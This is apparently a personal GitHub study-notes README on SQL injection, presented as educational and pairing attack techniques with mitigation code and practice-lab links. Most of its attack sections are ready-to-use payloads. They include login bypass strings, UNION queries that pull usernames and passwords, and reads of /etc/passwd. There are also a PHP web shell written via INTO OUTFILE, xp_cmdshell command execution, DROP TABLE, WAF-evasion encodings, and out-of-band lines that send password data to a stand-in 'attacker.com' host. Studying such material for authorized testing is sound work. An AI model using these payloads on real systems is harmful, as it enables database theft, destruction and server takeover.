# 💉 SQL Injection - Comprehensive Study Notes

<div align="center">

![SQL Injection](https://img.shields.io/badge/SQL_Injection-Critical-red?style=for-the-badge)
![OWASP](https://img.shields.io/badge/OWASP-Top_10-orange?style=for-the-badge)
![Status](https://img.shields.io/badge/Status-Active-green?style=for-the-badge)

**Complete guide to SQL Injection vulnerabilities, exploitation techniques, and mitigation strategies**

</div>

---

## ⚠️ Legal Disclaimer

This repository is for **educational purposes only**. The techniques and payloads shown are intended for:
- Authorized penetration testing
- Security research in controlled environments  
- Learning and skill development in cybersecurity

**Unauthorized access to databases or computer systems is illegal.**
Always obtain proper written authorization before testing.

---

## 📋 Table of Contents

1. [What is SQL Injection?](#what-is-sql-injection)
2. [Types of SQL Injection](#types-of-sql-injection)
3. [Exploitation Techniques](#exploitation-techniques)
4. [Advanced Techniques](#advanced-techniques)
5. [Database-Specific Payloads](#database-specific-payloads)
6. [Detection Methods](#detection-methods)
7. [Mitigation Strategies](#mitigation-strategies)
8. [Practice Labs](#practice-labs)
9. [Tools & Resources](#tools--resources)

---

## 🎯 What is SQL Injection?

SQL Injection (SQLi) is a web security vulnerability that allows attackers to interfere with database queries. Attackers can:
- View sensitive data
- Modify or delete database content
- Execute administrative operations
- Potentially gain system-level access

**Impact:** Critical - Can lead to complete database compromise

**OWASP Ranking:** #3 in OWASP Top 10 (2021)

---

## 🔍 Types of SQL Injection

### 1️⃣ In-Band SQL Injection (Classic)

#### Error-Based SQLi
When the database returns error messages that reveal information.

**Example Payload:**
```sql
' OR 1=1--
" OR "1"="1
' OR '1'='1'--
```

**Testing:**
```sql
https://example.com/product?id=1'
```

#### Union-Based SQLi
Uses UNION operator to combine results from injected queries.

**Example Payload:**
```sql
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT username, password FROM users--
' UNION SELECT table_name, NULL FROM information_schema.tables--
```

### 2️⃣ Blind SQL Injection

#### Boolean-Based Blind SQLi
No direct output, relies on TRUE/FALSE conditions.

**Example Payload:**
```sql
' AND 1=1--  (Returns TRUE)
' AND 1=2--  (Returns FALSE)
' AND (SELECT LENGTH(database()))>5--
```

#### Time-Based Blind SQLi
Uses database sleep functions to confirm injection.

**Example Payload:**
```sql
'; IF (1=1) WAITFOR DELAY '0:0:5'--
' AND SLEEP(5)--
' OR IF(1=1, SLEEP(5), 0)--
```

### 3️⃣ Out-of-Band SQL Injection

Uses alternative channels (DNS, HTTP) to exfiltrate data.

**Example Payload:**
```sql
'; EXEC xp_dirtree '\\attacker.com\share'--
' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users),'.attacker.com\\'))--
```

---

## 💻 Exploitation Techniques

### Basic Authentication Bypass

**Login Form Bypass:**
```sql
Username: admin' OR '1'='1'--
Password: anything

Username: admin'--
Password: (empty)

Username: ' OR 1=1--
Password: ' OR 1=1--
```

### Extracting Database Version

**MySQL:**
```sql
' UNION SELECT NULL, @@version--
```

**PostgreSQL:**
```sql
' UNION SELECT NULL, version()--
```

**MSSQL:**
```sql
' UNION SELECT NULL, @@version--
```

**Oracle:**
```sql
' UNION SELECT NULL, banner FROM v$version--
```

### Enumerating Databases

**List all databases:**
```sql
' UNION SELECT schema_name FROM information_schema.schemata--
```

**List tables in current database:**
```sql
' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()--
```

**List columns in a table:**
```sql
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
```

### Data Extraction

**Extract usernames and passwords:**
```sql
' UNION SELECT username, password FROM users--
' UNION SELECT group_concat(username), group_concat(password) FROM users--
```

**Extract multiple columns:**
```sql
' UNION SELECT username, email, password FROM users--
```

---

## 🚀 Advanced Techniques

### WAF Bypass Techniques

**Comment obfuscation:**
```sql
' OR/**/1=1--
' OR/*comment*/1=1--
'/**/OR/**/1=1--
```

**Case variation:**
```sql
' oR 1=1--
' Or 1=1--
' UnIoN SeLeCt--
```

**Whitespace alternatives:**
```sql
'+OR+1=1--
'%09OR%091=1--  (tab)
'%0AOR%0A1=1--  (newline)
```

**Encoding:**
```sql
' %4fR 1=1--  (URL encoded OR)
' %55nion %53elect--  (URL encoded UNION SELECT)
```

### Second-Order SQL Injection

Payload stored in database and executed later.

**Example:**
```sql
Register username: admin'--
Later when used: SELECT * FROM users WHERE username='admin'--'
```

### Stacked Queries

Execute multiple statements in one injection.

**MSSQL:**
```sql
'; DROP TABLE users--
'; EXEC xp_cmdshell('whoami')--
```

**PostgreSQL:**
```sql
'; CREATE TABLE test(data text)--
```

### Reading Files

**MySQL:**
```sql
' UNION SELECT LOAD_FILE('/etc/passwd')--
```

**MSSQL:**
```sql
' UNION SELECT * FROM OPENROWSET(BULK 'C:\Windows\win.ini', SINGLE_CLOB) AS x--
```

### Writing Files (Web Shell Upload)

**MySQL:**
```sql
' UNION SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--
```

---

## 🎯 Database-Specific Payloads

### MySQL Payloads

```sql
-- Version
' UNION SELECT @@version--

-- Current user
' UNION SELECT user()--

-- Database name
' UNION SELECT database()--

-- List databases
' UNION SELECT schema_name FROM information_schema.schemata--

-- Read file
' UNION SELECT LOAD_FILE('/etc/passwd')--

-- Write file
' UNION SELECT 'shell' INTO OUTFILE '/tmp/shell.php'--
```

### PostgreSQL Payloads

```sql
-- Version
' UNION SELECT version()--

-- Current user
' UNION SELECT current_user--

-- List tables
' UNION SELECT tablename FROM pg_tables--

-- Read file
'; COPY (SELECT '') TO PROGRAM 'cat /etc/passwd'--
```

### MSSQL Payloads

```sql
-- Version
' UNION SELECT @@version--

-- Current user
' UNION SELECT SYSTEM_USER--

-- List databases
' UNION SELECT name FROM master..sysdatabases--

-- Command execution
'; EXEC xp_cmdshell 'whoami'--

-- Read file
' UNION SELECT * FROM OPENROWSET(BULK 'C:\file.txt', SINGLE_CLOB)--
```

### Oracle Payloads

```sql
-- Version
' UNION SELECT banner FROM v$version--

-- Current user
' UNION SELECT user FROM dual--

-- List tables
' UNION SELECT table_name FROM all_tables--
```

---

## 🔎 Detection Methods

### Manual Testing

**Basic tests:**
```sql
'
"
`
')
")
`)
' OR 1=1--
" OR "1"="1
```

**Error generation:**
```sql
'
''
"
""
AND 1=2
OR 1=2
```

### Automated Tools

- **SQLMap** - Automated SQL injection tool
- **Burp Suite** - Web vulnerability scanner
- **OWASP ZAP** - Security testing tool
- **Havij** - Automated SQL Injection tool
- **jSQL Injection** - Java-based tool

---

## 🛡️ Mitigation Strategies

### 1. Prepared Statements (Parameterized Queries)

**PHP (PDO):**
```php
$stmt = $pdo->prepare('SELECT * FROM users WHERE username = ?');
$stmt->execute([$username]);
```

**Python:**
```python
cursor.execute("SELECT * FROM users WHERE username = %s", (username,))
```

**Java:**
```java
PreparedStatement stmt = connection.prepareStatement("SELECT * FROM users WHERE username = ?");
stmt.setString(1, username);
```

### 2. Input Validation

- Whitelist allowed characters
- Validate data types
- Limit input length
- Use regular expressions

### 3. Stored Procedures

```sql
CREATE PROCEDURE GetUser(@username varchar(50))
AS
BEGIN
    SELECT * FROM users WHERE username = @username
END
```

### 4. Least Privilege Principle

- Use dedicated database accounts
- Limit permissions to necessary operations
- Avoid using database admin accounts

### 5. Web Application Firewall (WAF)

- ModSecurity
- Cloudflare WAF
- AWS WAF
- Azure WAF

---

## 🧪 Practice Labs

### Online Platforms

1. **PortSwigger Web Security Academy**
   - Free SQL injection labs
   - Progressive difficulty
   - [Link](https://portswigger.net/web-security/sql-injection)

2. **HackTheBox**
   - Vulnerable machines with SQL injection
   - Real-world scenarios

3. **TryHackMe**
   - SQL Injection room
   - Guided tutorials

4. **DVWA (Damn Vulnerable Web Application)**
   - Local practice environment
   - Multiple difficulty levels

5. **bWAPP**
   - 100+ web vulnerabilities
   - Includes various SQL injection types

---

## 🔧 Tools & Resources

### Essential Tools

- **SQLMap** - `sqlmap -u "url" --dbs`
- **Burp Suite** - Intercepting proxy
- **OWASP ZAP** - Web app security scanner
- **Commix** - Command injection exploitation

### Payload Lists

- **PayloadsAllTheThings** - Comprehensive payload collection
- **SecLists** - SQL injection wordlists
- **PentestMonkey** - SQL injection cheat sheet

### Learning Resources

- OWASP SQL Injection Guide
- PortSwigger SQL Injection Tutorial
- PentesterLab SQL Injection Exercises
- HackerOne Disclosed Reports

---

## 📚 Cheat Sheets

**Quick Reference:**
```sql
-- Comments
--
#
/* */

-- Authentication Bypass
admin' OR '1'='1'--
admin'--
' OR 1=1--

-- Union Injection
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--

-- Extract Data
' UNION SELECT username, password FROM users--

-- Time Delays
'; WAITFOR DELAY '0:0:5'--  (MSSQL)
'; SELECT SLEEP(5)--  (MySQL)
'; SELECT pg_sleep(5)--  (PostgreSQL)
```

---

## 🎯 Testing Methodology

1. **Identify injection points** - Input fields, URL parameters, headers
2. **Test for vulnerability** - Use basic payloads
3. **Determine injection type** - Error-based, blind, etc.
4. **Identify database** - Fingerprint DBMS
5. **Enumerate schema** - Tables, columns
6. **Extract data** - Usernames, passwords, sensitive info
7. **Escalate privileges** - If possible
8. **Document findings** - For reporting

---

## 📝 My Practice Notes

### Machines Completed:
- [ ] PortSwigger Lab 1 - Error-based SQLi
- [ ] PortSwigger Lab 2 - Union-based SQLi
- [ ] PortSwigger Lab 3 - Blind SQLi
- [ ] HTB Machine - [Name]
- [ ] TryHackMe - SQL Injection Room

### Key Learnings:
- [Add your personal notes and insights here]

---

## 🤝 Contributing

Found a new technique or payload? Feel free to contribute!

---

## 📫 Contact

For questions or discussions about SQL injection:
- **Email:** ofirhalfin13@gmail.com
- **LinkedIn:** [Your LinkedIn]

---

<div align="center">

**⚠️ Remember: Always get proper authorization before testing! ⚠️**

![Visitors](https://visitor-badge.laobi.icu/badge?page_id=Halfinity.sql-injection-notes)

</div>
